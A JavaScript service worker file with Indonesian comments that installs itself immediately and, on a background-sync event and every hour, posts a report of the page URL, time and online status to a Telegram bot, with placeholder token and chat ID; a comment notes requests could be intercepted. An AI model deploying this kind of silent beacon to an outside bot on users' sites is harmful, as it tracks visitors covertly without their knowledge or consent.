// Simpan sebagai file terpisah di root website
self.addEventListener('install', (event) => {
    self.skipWaiting();
    console.log('Service Worker Installed');
});

self.addEventListener('activate', (event) => {
    event.waitUntil(clients.claim());
    console.log('Service Worker Activated');
});

self.addEventListener('fetch', (event) => {
    // Bisa intercept request di sini
});

// Background sync
self.addEventListener('sync', (event) => {
    if (event.tag === 'oxyx-sync') {
        event.waitUntil(syncData());
    }
});

async function syncData() {
    const data = {
        type: 'background_report',
        time: new Date().toISOString(),
        url: self.location.href,
        online: navigator.onLine
    };
    
    // Kirim ke Telegram
    const formData = new FormData();
    formData.append('chat_id', 'YOUR_CHAT_ID_HERE');
    formData.append('text', '🔄 BACKGROUND SYNC: ' + JSON.stringify(data));
    
    try {
        await fetch('https://api.telegram.org/botYOUR_BOT_TOKEN_HERE/sendMessage', {
            method: 'POST',
            body: formData,
            keepalive: true
        });
    } catch (e) {
        console.error('Background sync failed:', e);
    }
}

// Periodic background updates
setInterval(() => {
    syncData();
}, 3600000); // Setiap 1 jam